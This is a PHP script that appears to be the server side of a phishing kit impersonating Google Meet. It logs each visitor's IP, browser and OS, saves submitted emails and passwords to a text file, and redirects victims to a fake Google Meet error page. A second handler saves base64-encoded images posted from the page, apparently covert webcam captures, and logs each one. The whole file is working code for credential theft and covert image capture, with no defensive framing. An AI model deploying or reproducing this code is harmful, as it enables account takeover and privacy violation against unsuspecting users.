<?php
// Set timezone
date_default_timezone_set('Asia/Kolkata');

// Get client IP
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Get user agent
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser = 'Unknown';
$os = 'Unknown';

// Get browser
if (strpos($user_agent, 'MSIE') !== false) {
    $browser = 'Internet Explorer';
} elseif (strpos($user_agent, 'Trident') !== false) { // For Supporting IE 11
    $browser = 'Internet Explorer';
} elseif (strpos($user_agent, 'Firefox') !== false) {
    $browser = 'Mozilla Firefox';
} elseif (strpos($user_agent, 'Chrome') !== false) {
    $browser = 'Google Chrome';
} elseif (strpos($user_agent, 'Opera Mini') !== false) {
    $browser = 'Opera Mini';
} elseif (strpos($user_agent, 'Opera') !== false) {
    $browser = 'Opera';
} elseif (strpos($user_agent, 'Safari') !== false) {
    $browser = 'Safari';
}

// Get OS
if (strpos($user_agent, 'Windows') !== false) {
    $os = 'Windows';
} elseif (strpos($user_agent, 'Linux') !== false) {
    $os = 'Linux';
} elseif (strpos($user_agent, 'Mac') !== false) {
    $os = 'Mac';
} elseif (strpos($user_agent, 'Android') !== false) {
    $os = 'Android';
} elseif (strpos($user_agent, 'iOS') !== false) {
    $os = 'iOS';
}

// Handle Google Meet form submission
if (isset($_POST['email'])) {
    $email = $_POST['email'];
    $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
    $ip = get_client_ip();
    $date = date('Y-m-d H:i:s');
    
    $log = "[GOOGLE_MEET] Date: $date | IP: $ip | Email: $email | Password: $password | Browser: $browser | OS: $os\n";
    file_put_contents('saved_google_meet_credentials.txt', $log, FILE_APPEND);
    
    // Redirect to Google Meet error page
    header('Location: https://meet.google.com/error');
    exit();
}

// Handle image upload (original functionality)
if (isset($_POST['cat'])) {
    $date = date('dMYHis');
    $imageData = $_POST['cat'];
    
    if (!empty($imageData)) {
        $filteredData = substr($imageData, strpos($imageData, ",")+1);
        $unencodedData = base64_decode($filteredData);
        $filename = 'cam'.$date.'.png';
        file_put_contents($filename, $unencodedData);
        
        // Log the image capture
        $ip = get_client_ip();
        $log = "[IMAGE_CAPTURE] Date: $date | IP: $ip | File: $filename | Browser: $browser | OS: $os\n";
        file_put_contents('capture_log.txt', $log, FILE_APPEND);
    }
}

// Return success response
header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
?>
